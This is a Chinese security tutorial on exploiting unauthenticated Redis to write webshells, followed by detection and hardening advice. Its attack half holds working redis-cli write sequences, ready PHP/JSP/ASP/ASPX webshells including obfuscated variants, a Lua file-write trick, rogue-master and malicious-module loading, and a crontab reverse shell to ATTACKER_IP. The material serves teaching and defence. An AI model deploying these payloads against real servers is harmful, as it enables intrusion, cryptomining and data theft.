---
title: "案例七：Redis未授权访问写入WebShell"
type: docs
weight: 8
---

## 案例七：Redis未授权访问写入WebShell

Redis未授权访问是渗透测试中最常见的数据库安全问题之一。当Redis实例暴露在公网上且未设置认证时，攻击者可以利用Redis的持久化机制将任意内容写入服务器文件系统，从而植入WebShell获取远程命令执行权限。本案例从原理层面深入剖析这一攻击手法，覆盖不同Web服务器环境、多种Shell变体、防御绕过技巧以及完整的检测与修复方案。

> **与案例四的区别**：案例四侧重Redis未授权访问的整体攻击面（WebShell、SSH公钥注入、Crontab反弹Shell），本案例聚焦WebShell写入这一技术路径，深入探讨Web目录探测、Shell代码变形、多语言适配、持久化维持等高级细节。

### 背景知识：Redis持久化与文件写入原理

#### Redis的两种持久化机制

Redis提供RDB和AOF两种持久化方式，攻击者利用的是RDB持久化：

| 持久化方式 | 触发条件 | 文件格式 | 攻击利用 |
|-----------|---------|---------|---------|
| RDB快照 | SAVE / BGSAVE命令 | 二进制RDB格式 | 可通过CONFIG SET控制输出路径和文件名 |
| AOF日志 | 每次写操作追加 | RESP协议文本 | 追加模式，难以精确控制内容 |

RDB文件虽然是二进制格式，但其内部以Redis序列化协议（RESP）存储键值对。当我们将一个键的值设置为PHP/JSP/ASP等脚本代码时，这段代码会被原样嵌入RDB文件中。由于Web服务器解释执行脚本时会忽略文件中的非脚本部分，只要脚本代码出现在文件的可解析位置，WebShell就能正常工作。

#### CONFIG SET的文件写入能力

Redis的`CONFIG SET`命令允许运行时修改配置参数，其中两个关键参数：

- **dir**：RDB持久化文件的保存目录
- **dbfilename**：RDB持久化文件的文件名

通过组合这两个参数，攻击者可以将RDB文件写入服务器文件系统的任意可写目录，并以任意扩展名命名。当目标路径指向Web服务器的文档根目录时，写入的文件可以通过HTTP访问。

```text
CONFIG SET dir /var/www/html/      → 设置保存目录为Web根目录
CONFIG SET dbfilename shell.php    → 设置文件名为shell.php
SET payload "<?php ... ?>"         → 将WebShell代码存入Redis
SAVE                               → 触发RDB持久化，写入文件
```

### 攻击前置条件

并非所有Redis未授权访问都能成功写入WebShell，需要同时满足以下条件：

```text
条件一：Redis端口（默认6379）可从外部访问
  └─ 检测：nmap -sV -p 6379 target_ip
  └─ 常见原因：云服务器安全组配置不当、Docker默认暴露端口

条件二：Redis未设置密码认证
  └─ 检测：redis-cli -h target_ip INFO
  └─ 常见原因：默认配置未修改、开发环境误上线

条件三：Redis进程对目标目录有写入权限
  └─ 关键：Redis通常以redis用户运行，需Web目录对other可写
  └─ 或Web目录属主恰好是redis用户（某些一键部署环境）

条件四：目标服务器运行了Web服务且可从外部访问
  └─ 检测：curl http://target_ip:80/ 或 nmap -p 80,443,8080 target_ip

条件五：Web服务器能解析写入的脚本语言
  └─ PHP → Apache/Nginx + PHP-FPM
  └─ JSP → Tomcat/Jetty
  └─ ASP/ASPX → IIS
```

### 完整攻击流程

#### 第一步：信息收集与环境探测

在写入WebShell之前，必须先确认目标环境：

```bash
# 1. 确认Redis未授权访问
redis-cli -h 192.168.1.100
> INFO server
# 返回Redis版本、操作系统等信息则确认未授权

# 2. 获取操作系统类型
> INFO server
# redis_os: Linux 5.4.0-xxx-generic x86_64

# 3. 获取Redis运行用户
> CONFIG GET dir
# 返回Redis数据目录，可推断运行用户
# 例如 /var/lib/redis → 通常为redis用户

# 4. 探测Web服务
> CONFIG SET dir /var/www/html/
# 如果返回OK，说明Redis进程对该目录有写权限
# 如果返回 ERR ... Permission denied，需要尝试其他目录

# 5. 确认Web服务器类型（通过外部探测）
curl -I http://192.168.1.100/
# Server: Apache/2.4.41 (Ubuntu)
# Server: nginx/1.18.0
```

#### 第二步：探测可写Web目录

不同环境的Web文档根目录不同，需要逐一尝试：

```bash
# Linux常见Web目录
CONFIG SET dir /var/www/html/          # Apache/Ubuntu默认
CONFIG SET dir /var/www/               # 某些发行版
CONFIG SET dir /usr/share/nginx/html/  # Nginx默认
CONFIG SET dir /opt/lampp/htdocs/      # XAMPP
CONFIG SET dir /home/www/              # 自定义部署
CONFIG SET dir /tmp/                   # 临时目录（几乎总是可写）

# Windows常见Web目录
CONFIG SET dir C:\phpstudy\WWW\        # phpStudy集成环境
CONFIG SET dir C:\xampp\htdocs\        # XAMPP Windows版
CONFIG SET dir C:\inetpub\wwwroot\     # IIS默认
CONFIG SET dir D:\wwwroot\             # 宝塔面板常见

# 通过CONFIG SET dir的返回值判断权限
# OK → 目录存在且可写
# ERR ... No such file or directory → 目录不存在
# ERR ... Permission denied → 无写入权限
```

如果常见目录都不可写，可以尝试以下变通方法：

```bash
# 方法一：利用已知可写的Redis数据目录
CONFIG SET dir /var/lib/redis/
CONFIG SET dbfilename dump.rdb
# 写入后再利用其他漏洞（LFI/文件包含）加载

# 方法二：写入/tmp目录后利用符号链接
CONFIG SET dir /tmp/
CONFIG SET dbfilename shell.php
# 如果Web服务器的DocumentRoot包含指向/tmp的符号链接

# 方法三：利用日志文件路径
CONFIG SET dir /var/log/nginx/
CONFIG SET dbfilename access.log
# 通过User-Agent注入PHP代码，访问日志触发执行
```

#### 第三步：写入WebShell

根据目标Web服务器支持的语言，选择对应的WebShell：

**PHP WebShell（最常见）：**

```bash
# 基础版：一句话木马
SET shell "<?php @eval(\$_POST['cmd']); ?>"
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SAVE

# 增强版：带密码验证的WebShell
SET shell "<?php if(md5(\$_GET['pwd'])==='e10adc3949ba59abbe56e057f20f883e'){@eval(\$_POST['cmd']);} ?>"
# 密码为 123456

# 隐藏版：变形WebShell
SET shell "<?php \$a='ev'.'al'; \$b='(\$_PO'.'ST[chr(99).chr(109).chr(100)])'; \$a(\$b); ?>"

# 无字母WebShell（绕过WAF关键字检测）
SET shell "<?php \$_=[];\$_=@".\$_;\$_=\$_['!'=='@'];\$__=\$_;\$__++;... ?>"  # 此类变形技术较复杂

# 利用PHP反序列化
SET shell '<?php class A{public \$cmd;function __destruct(){@eval(\$this->cmd);}}unserialize(\$_GET["data"]);?>'
```

**JSP WebShell（Tomcat环境）：**

```bash
# 基础版
SET shell '<%
  Runtime rt = Runtime.getRuntime();
  String[] cmd = {"/bin/bash", "-c", request.getParameter("cmd")};
  Process p = rt.exec(cmd);
  java.io.InputStream is = p.getInputStream();
  int a = -1;
  byte[] b = new byte[2048];
  while((a=is.read(b))!=-1){out.print(new String(b));}
%>'
CONFIG SET dir /opt/tomcat/webapps/ROOT/
CONFIG SET dbfilename shell.jsp
SAVE

# 冰蝎内存马风格（更隐蔽）
SET shell '<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getMethod().equals("POST")){...'
```

**ASP/ASPX WebShell（IIS环境）：**

```bash
# ASP版
SET shell '<%eval request("cmd")%>'
CONFIG SET dir C:\inetpub\wwwroot\
CONFIG SET dbfilename shell.asp
SAVE

# ASPX版
SET shell '<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>'
CONFIG SET dir C:\inetpub\wwwroot\
CONFIG SET dbfilename shell.aspx
SAVE
```

#### 第四步：WebShell访问与验证

```bash
# 访问WebShell
curl "http://192.168.1.100/shell.php?cmd=whoami"
# 返回: www-data

# 验证系统信息
curl "http://192.168.1.100/shell.php?cmd=uname -a"
# 返回: Linux webserver 5.4.0-xxx ...

# 验证网络信息
curl "http://192.168.1.100/shell.php?cmd=ifconfig"

# 验证WebShell密码（带密码验证的版本）
curl -X POST "http://192.168.1.100/shell.php?pwd=123456" -d "cmd=whoami"
```

### RDB文件的垃圾数据问题

通过RDB持久化写入的WebShell文件包含大量Redis二进制头部数据，这是一个潜在问题：

```text
REDIS0009�  redis-ver  6.0.16�  ...  shell  $23  <?php @eval(...); ?>  ...
```

**为什么WebShell仍然能工作：**

- PHP解释器从头扫描文件，遇到`<?php`标记开始执行，遇到`?>`标记结束
- 标记之前和之后的二进制数据不会影响PHP解析
- 其他WebShell语言（JSP的`<% %>`、ASP的`<% %>`）同理

**但存在以下风险：**

- 文件体积异常（通常几百字节到几KB），容易被监控系统发现
- 文件头包含`REDIS`关键字，IDS/IPS可直接匹配
- 某些WAF会检查文件内容是否为合法PHP代码

**优化方案：利用Redis Lua脚本精确控制文件内容**

```bash
# 使用Redis Lua脚本写入纯净内容（Redis 2.6+）
# 通过EVAL命令执行Lua，利用io.write精确写入文件
EVAL "local f=io.open('/var/www/html/shell.php','w');f:write('<?php @eval($_POST[\"cmd\"]); ?>');f:close();return 1" 0
```

> **注意**：Lua脚本写文件要求Redis编译时启用了Lua系统调用（默认启用），且Redis进程对目标路径有写权限。此方法写入的文件不包含RDB头部数据，更加隐蔽。

### 多种持久化利用变体

#### 变体一：利用主从复制写入文件

Redis 4.0+引入的模块系统和主从复制机制提供了另一种文件写入路径：

```bash
# 攻击者启动一个恶意Redis实例作为master
# 目标Redis作为slave连接到攻击者的master
# 通过FULLSYNC将攻击者构造的RDB文件同步到目标

# 攻击者端：使用redis-rogue-server等工具
python3 redis-rogue-server.py --rhost 192.168.1.100 --lhost 192.168.1.200
# 工具会自动完成主从切换、模块加载、文件写入
```

#### 变体二：利用MODULE LOAD加载恶意模块

Redis 4.0+支持动态加载.so模块：

```bash
# 将恶意.so文件写入目标（通过主从复制或CONFIG SET）
# 然后加载模块执行任意命令
MODULE LOAD /tmp/evil.so
system.exec "whoami"
```

#### 变体三：利用Redis命令写入计划任务

虽然不属于WebShell范畴，但在Web目录不可写时是常见替代方案：

```bash
# 写入Crontab反弹Shell（CentOS/RHEL）
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
SAVE

# 注意：Ubuntu的Crontab文件名格式不同
# Ubuntu: /var/spool/cron/crontabs/<username>
# CentOS: /var/spool/cron/<username>
```

### 检测与取证

#### 从防御方视角检测Redis WebShell攻击

**1. Redis审计日志分析**

```bash
# 开启Redis慢查询日志和命令监控
# redis.conf 配置：
# loglevel notice
# logfile /var/log/redis/redis.log

# 实时监控可疑命令
redis-cli MONITOR | grep -E "CONFIG SET|SAVE|EVAL"
```

典型攻击日志特征：

```text
1672531200.123456 [0 192.168.1.200:54321] "CONFIG" "SET" "dir" "/var/www/html/"
1672531200.234567 [0 192.168.1.200:54321] "CONFIG" "SET" "dbfilename" "shell.php"
1672531200.345678 [0 192.168.1.200:54321] "SET" "shell" "<?php ..."
1672531200.456789 [0 192.168.1.200:54321] "SAVE"
```

**2. 文件系统监控**

```bash
# 使用inotifywait监控Web目录文件创建
inotifywait -m -e create -e modify /var/www/html/

# 使用auditd审计关键目录
auditctl -w /var/www/html/ -p wa -k webshell_watch
ausearch -k webshell_watch -ts recent

# 检查Web目录下最近创建的可疑文件
find /var/www/html/ -name "*.php" -newer /var/www/html/index.php -ls
find /var/www/html/ -name "*.php" -size -10k -ls  # RDB写入的文件通常较小

# 检查文件内容是否包含Redis RDB头部
grep -rl "REDIS" /var/www/html/*.php
```

**3. 网络流量分析**

```bash
# Redis协议使用RESP格式，攻击流量特征明显
# 抓包分析
tcpdump -i eth0 port 6379 -A | grep -E "CONFIG|SAVE|EVAL"

# 使用Suricata/Snort规则检测
# alert tcp any any -> any 6379 (msg:"Redis CONFIG SET Attack"; \
#   content:"CONFIG"; content:"SET"; content:"SAVE"; sid:1000001;)
```

#### WebShell文件的典型特征

| 特征 | 描述 | 检测方法 |
|-----|------|---------|
| 文件头包含REDIS字样 | RDB持久化写入的文件以REDIS00xx开头 | `head -c 20 file.php` |
| 文件体积异常小 | 通常100字节到2KB | `find / -name "*.php" -size -5k` |
| 创建时间异常 | 非部署时段创建的PHP文件 | `find / -name "*.php" -newermt "2024-01-01"` |
| 包含eval/exec/system等函数 | WebShell常用函数 | `grep -rl "eval\|exec\|system\|passthru" /var/www/` |
| 文件权限异常 | 由redis用户而非www-data创建 | `ls -la /var/www/html/shell.php` |

### 防御措施

#### 基础防护（必须实施）

**1. 配置Redis密码认证**

```bash
# redis.conf
requirepass YourStrongPassword2024!

# 使用密码连接
redis-cli -a YourStrongPassword2024!
```

密码强度要求：至少16位，包含大小写字母、数字和特殊字符。推荐使用随机生成的密码：

```bash
openssl rand -base64 32
```

**2. 绑定监听地址**

```bash
# redis.conf
# 只监听本机
bind 127.0.0.1 ::1

# 如果需要局域网访问，绑定特定内网IP
bind 127.0.0.1 192.168.1.10
```

**3. 修改默认端口**

```bash
# redis.conf
port 16379  # 改为非标准端口，降低被扫描发现的概率
```

**4. 禁用危险命令**

```bash
# redis.conf - 重命名或禁用高危命令
rename-command CONFIG ""
rename-command SAVE ""
rename-command BGSAVE ""
rename-command DEBUG ""
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command SHUTDOWN ""
rename-command SLAVEOF ""
```

> **注意**：禁用CONFIG命令后，运行时无法修改配置。建议用rename-command将其重命名为一个复杂字符串（如`CONFIG_a8f3b2c1`），仅管理员知道。

#### 进阶防护

**5. 以低权限用户运行并限制文件系统访问**

```bash
# 创建专用用户
useradd -r -s /sbin/nologin redis

# systemd服务文件
# /etc/systemd/system/redis.service
[Service]
User=redis
Group=redis
ReadWriteDirectories=/var/lib/redis
ProtectHome=yes
ProtectSystem=strict
PrivateTmp=yes
NoNewPrivileges=yes
```

**6. 使用Protected Mode**

Redis 3.2+默认开启protected mode，当没有设置密码且绑定了外部IP时，拒绝外部连接。确保此配置未被关闭：

```bash
# redis.conf
protected-mode yes
```

**7. 启用Redis ACL（Redis 6.0+）**

```bash
# 使用ACL精细控制用户权限
ACL SETUSER webapp on >password ~* +@read -@admin -@dangerous
ACL SETUSER admin on >adminpass ~* +@all
```

**8. 网络层防护**

```bash
# iptables限制Redis端口访问
iptables -A INPUT -p tcp --dport 6379 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP

# 使用云安全组限制来源IP
# 只允许应用服务器IP访问6379端口
```

**9. Web目录权限加固**

```bash
# 确保Web目录不可被Redis用户写入
chown -R www-data:www-data /var/www/html/
chmod -R 755 /var/www/html/
# 移除other的写权限
chmod o-w /var/www/html/

# 使用open_basedir限制PHP可访问的目录
# php.ini
open_basedir = /var/www/html/:/tmp/
```

#### 自动化检测方案

```bash
#!/bin/bash
# redis_webshell_check.sh - 定期检查Web目录可疑文件

WEB_DIR="/var/www/html"
LOG="/var/log/webshell_check.log"

echo "[$(date)] Starting webshell check..." >> "$LOG"

# 检查包含REDIS头部的PHP文件
for f in $(find "$WEB_DIR" -name "*.php" -o -name "*.jsp" -o -name "*.asp"); do
    if head -c 5 "$f" | grep -q "REDIS"; then
        echo "[ALERT] Suspected Redis-written file: $f" >> "$LOG"
        # 可选：自动隔离
        # mv "$f" /quarantine/$(basename "$f").$(date +%s)
    fi
done

# 检查包含eval/exec的可疑文件
grep -rl --include="*.php" "eval\s*(" "$WEB_DIR" >> "$LOG" 2>/dev/null
grep -rl --include="*.php" "system\s*(" "$WEB_DIR" >> "$LOG" 2>/dev/null

echo "[$(date)] Check complete." >> "$LOG"
```

### 实战场景复盘

#### 场景一：云服务器Redis暴露导致批量入侵

**背景**：某公司使用云服务器部署业务系统，Redis监听在0.0.0.0:6379，未设置密码，安全组放行了全部端口。

**攻击链**：
1. 攻击者使用Shodan/ZoomEye搜索`port:6379 country:CN`发现目标
2. 通过`redis-cli`连接确认未授权访问
3. 探测到Web目录`/usr/share/nginx/html/`可写
4. 写入PHP一句话木马`shell.php`
5. 通过蚁剑/冰蝎连接WebShell
6. 提权至root，植入挖矿木马

**损失**：服务器被控制用于挖矿，产生高额云资源费用；业务数据面临泄露风险。

**根因**：Redis默认配置上线 + 安全组规则过于宽松。

#### 场景二：内网渗透中Redis作为跳板

**背景**：攻击者已通过Web应用漏洞获取内网一台服务器权限，发现内网中存在未授权Redis实例。

**攻击链**：
1. 内网扫描发现192.168.10.50:6379存在未授权Redis
2. 该服务器同时运行Nginx + PHP
3. 写入WebShell到Nginx Web目录
4. 通过WebShell获取该服务器权限
5. 以此为跳板继续横向移动

**防御启示**：内网不应视为可信环境，Redis等服务同样需要认证保护。

### 工具推荐

| 工具 | 用途 | 地址 |
|-----|------|------|
| redis-cli | Redis官方命令行客户端 | 随Redis安装 |
| redis-rogue-server | Redis主从复制RCE工具 | GitHub开源 |
| RedisWriteFile | 自动化Redis写文件工具 | GitHub开源 |
| redis-exploit | 综合Redis利用工具 | GitHub开源 |
| 蚁剑（AntSword） | WebShell管理工具 | antsword.cn |
| 冰蝎（Behinder） | 加密WebShell管理器 | GitHub开源 |
| 哥斯拉（Godzilla） | 新一代WebShell管理器 | GitHub开源 |

### 常见误区与注意事项

**误区一：认为Redis有密码就安全了**

即使设置了`requirepass`，如果密码强度不足（如`123456`、`redis`），攻击者可以通过字典攻击破解。必须使用强密码并定期更换。

**误区二：认为绑定内网IP就不需要密码**

内网中被入侵的主机可以作为跳板攻击Redis。零信任架构下，任何网络通信都应进行身份认证。

**误区三：禁用CONFIG命令就能完全防御**

攻击者可以利用主从复制、MODULE LOAD等其他途径写入文件。防御需要多层措施组合，而非依赖单一手段。

**误区四：WebShell写入后文件一定在Web根目录**

攻击者可以写入任意可写目录。如果Web应用存在文件包含漏洞，即使WebShell不在Web根目录也能被利用。

**误区五：忽略Windows环境下的Redis安全**

Windows上也有Redis部署（微软维护的分支、WSL环境、Docker容器），Web目录路径和攻击手法有差异但风险相同。

### 总结

Redis未授权访问写入WebShell是一个原理简单但危害严重的攻击手法。其核心利用了Redis持久化机制可以控制输出路径这一特性。防御的关键在于：首先确保Redis不暴露在不可信网络中，其次设置强密码认证，再次禁用或重命名危险命令，最后配合文件系统监控和Web目录权限加固形成多层防御。在实际渗透测试中，Redis未授权访问往往是内网横向移动的重要突破口，安全团队应将其作为内网安全评估的重点检查项。
